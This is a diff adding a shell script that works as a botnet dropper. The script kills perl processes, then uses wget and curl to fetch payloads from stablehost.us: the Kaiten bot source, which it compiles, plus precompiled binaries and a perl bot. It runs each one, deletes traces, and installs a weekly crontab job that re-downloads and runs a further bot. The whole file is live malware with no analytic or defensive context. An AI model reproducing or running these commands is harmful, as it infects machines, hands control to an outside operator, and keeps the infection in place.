@@ -1,0 +1,27 @@
+killall perl
+
+wget http://stablehost.us/bots/kaiten.c -O /tmp/a.c;
+curl -o /tmp/a.c http://stablehost.us/bots/kaiten.c;
+gcc -o /tmp/a /tmp/a.c;
+/tmp/a;
+rm -rf /tmp/a.c;
+   
+wget http://stablehost.us/bots/a -O /tmp/a;
+curl -o /tmp/a http://stablehost.us/bots/a;
+chmod +x /tmp/a;
+/tmp/a;
+
+wget http://stablehost.us/bots/darwin -O /tmp/d;
+curl -o /tmp/d http://stablehost.us/bots/darwin;
+chmod +x /tmp/d;
+/tmp/d;
+
+wget http://stablehost.us/bots/pl -O /tmp/pl;
+curl -o /tmp/pl http://stablehost.us/bots/pl;
+perl /tmp/pl;
+rm /tmp/pl;
+
+echo "@weekly curl -o /tmp/sh http://stablehost.us/bots/regular.bot;wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh" >/tmp/c;
+crontab /tmp/c;
+rm /tmp/c;
+
